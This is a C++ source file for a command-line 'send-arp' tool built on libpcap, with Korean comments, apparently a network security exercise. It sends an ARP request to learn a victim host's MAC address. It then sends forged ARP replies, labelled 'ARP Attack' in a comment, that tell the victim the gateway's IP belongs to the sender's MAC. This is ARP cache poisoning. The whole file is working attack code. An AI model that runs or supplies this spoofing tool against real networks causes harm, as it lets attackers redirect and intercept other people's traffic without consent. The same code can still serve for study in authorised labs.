#include "functions.h"

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {

	if (argc / 2 == 1) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];

	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	char myIp[40];
	Mac sender_mac;
	getMyIpAddr(myIp, dev);

	for(int ip = 2 ; ip < argc ; ip += 2){	

		/* Sender의 Mac 주소를 획득 */ 
		EthArpPacket requestPacket = setArpPacket(ArpHdr::Request, 
		myIp, argv[ip],  			//sender ip, target ip
		Mac("ff:ff:ff:ff:ff:ff"),  	//dmac 
		Mac(getMyMacAddr()),		//smac
		Mac(getMyMacAddr()),		//sender mac
		Mac("00:00:00:00:00:00"));	//target mac

		int res_send = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&requestPacket), sizeof(EthArpPacket));
		if (res_send != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res_send, pcap_geterr(handle));
		}

		struct pcap_pkthdr* header;
		const u_char* packet;
		/* ARP 응답 패킷을 받기 위함 */
		while (true) {
			int res = pcap_next_ex(handle, &header, &packet);
			if (res == 0) continue;
			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
				break;
			}
			
			/* 이더넷 패킷 확인 */ 
			EthArpPacket* arp;
			arp = (EthArpPacket*)packet;
			if(ntohs(arp->eth_.type_) == ETHERTYPE_ARP){
				
				/* ARP 패킷 확인 */	
				uint32_t senderIp = htonl((uint32_t)arp->arp_.sip_);
				char sipStr[33];
            	sprintf(sipStr, "%d.%d.%d.%d",
					(senderIp & 0xff000000) >> 3 * 8,
					(senderIp & 0xff0000) >> 2 * 8,
					(senderIp & 0xff00) >> 1 * 8,
					(senderIp & 0xff));

				/* Source IP와 Sender IP 비교 */
				if(strncmp(sipStr, argv[ip], strlen(argv[ip])) == 0){
					printf("%s\n", sipStr);
					sender_mac = arp->arp_.smac_;
					break;
				} 
			}
		}

		sleep(1);

		/* ARP Attack */
		EthArpPacket replyPacket = setArpPacket(ArpHdr::Reply, 
			argv[ip + 1], argv[ip], 		//sender ip, target ip
			sender_mac,						//dmac 
			Mac(getMyMacAddr()), 			//smac 
			Mac(getMyMacAddr()), 			//sender mac -> 게이트웨이의 IP와 나의 Mac 주소를 보냄
			sender_mac);					//target mac

		int res_send3 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&replyPacket), sizeof(EthArpPacket));
		if (res_send3 != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res_send3, pcap_geterr(handle));
		}
	}
	pcap_close(handle);
}
